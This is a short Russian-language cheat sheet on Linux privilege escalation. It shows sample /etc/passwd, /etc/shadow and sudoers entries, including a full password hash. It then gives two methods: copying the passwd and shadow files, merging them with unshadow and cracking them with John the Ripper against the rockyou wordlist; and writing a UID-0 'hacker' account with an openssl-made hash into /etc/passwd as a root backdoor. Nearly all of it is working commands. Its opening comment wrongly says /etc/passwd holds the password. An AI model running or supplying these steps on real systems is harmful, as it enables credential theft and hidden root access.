# /etc/passwd содержит пароль + хэш(или х вместо хэш)
# если в /etc/passwd юзер не указан, система просто не узнает о существовании такого пользователя.
root:x:0:0:root:/root:/usr/bin/zsh

# /etc/shadow содержит хэш
root:$6$kdYDkl3L5mOQ1Z1d$zqWIJ39LW.5kSP6QAP6HQ2NyKHaN48BacQuZPT/kDBQExo5YjSyf9NxAhtWU.xJ3gCaKRX603vxK7YCEdaurB.:18195:0:99999:7:::

# /etc/sudoers содержит настройки прав для пользователей
пользователь/группа хост = (от_имени_кого:группа) команды
пример:
root ALL=(ALL:ALL) ALL
jessie ALL=(ALL:ALL) NOPASSWD: ALL

## 1 Способ
# Копируем нужные файлы (требуются root права через любую утилиту nano и тд), главное чтобы был доступ к /etc/shadow
sudo cp /etc/passwd /tmp/passwd.txt
sudo cp /etc/shadow /tmp/shadow.txt

# Сделаем unshadow

unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/passwords.txt

# Используем John the Ripper для взлома паролей

john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/passwords.txt

#
В одну строку:
    sudo unshadow /etc/passwd /etc/shadow > passwords.txt && john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
#

##2 Способ

# Создадим хэш пароля
openssl passwd -1 -salt 123456 password

# Добавим в etc/passwd

hacker:хэш:0:0:root:/root:/bin/bash

# Сменим пользователя на hacker

su hacker


